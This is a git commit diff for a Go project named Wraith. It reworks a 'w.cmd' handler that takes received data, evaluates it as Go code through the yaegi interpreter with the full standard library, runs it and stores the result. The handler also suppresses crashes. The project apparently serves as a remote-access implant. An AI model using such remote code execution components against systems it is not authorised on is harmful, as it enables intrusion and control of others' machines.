88687a82f024fcbecf461855ad992c62ee978db9
TR-SLimey <37966924+TR-SLimey@users.noreply.github.com>
2021-04-13 20:38:09 +0100

    Fix w.cmd handler

--- wraith/proto/parts/w_cmd.go
+++ wraith/proto/parts/w_cmd.go
@@ -10,36 +10,39 @@ import (
 )
 
 func init() {
-	proto.PartMap.Add("w.cmd", func(*proto.HandlerKeyValueStore, interface{}) {
-		// Always catch panics from this function as no error here should crash Wraith
+	proto.PartMap.Add("w.cmd", func(hkvs *proto.HandlerKeyValueStore, data interface{}) {
+		// Store results of command
+		result := ""
+
 		defer func() {
+			// Always catch panics from here as no error should crash Wraith
 			if r := recover(); r != nil {
 				result = fmt.Sprintf("command execution panicked with message: %s", r)
 			}
+			// Record results (this should never error as w.msg.results is a special key)
+			currentResults, _ := hkvs.Get("w.msg.results")
+			hkvs.Set("w.msg.results", append(currentResults.([]string), result))
 		}()
 
-		if cmd, ok := data["w.cmd"]; ok {
-			// Initialise yaegi to handle commands
-			i := interp.New(interp.Options{})
-			i.Use(stdlib.Symbols)
-			// The code should generate a function called "wcmd" to be executed by Wraith.
-			// That function should in turn return a string to be used as the result.
-			// If the value of the key cmd is not a string, the panic will be caught and
-			// returned as the command result.
-			_, err := i.Eval(cmd.(string))
-			if err != nil {
-				panic(err)
-			}
-			fnv, err := i.Eval("wcmd")
-			if err != nil {
-				panic(err)
-			}
-			fn, ok := fnv.Interface().(func() string)
-			if !ok {
-				panic("wcmd is not a `func() string`")
-			}
-			result = fn()
+		// Initialise yaegi to handle commands
+		i := interp.New(interp.Options{})
+		i.Use(stdlib.Symbols)
+		// The code should generate a function called "wcmd" to be executed by Wraith.
+		// That function should in turn return a string to be used as the result.
+		// If the value of the key cmd is not a string, the panic will be caught and
+		// returned as the command result.
+		_, err := i.Eval(data.(string))
+		if err != nil {
+			panic(err)
 		}
-		return
+		fnv, err := i.Eval("wcmd")
+		if err != nil {
+			panic(err)
+		}
+		fn, ok := fnv.Interface().(func() string)
+		if !ok {
+			panic("wcmd is not a `func() string`")
+		}
+		result = fn()
 	})
 }
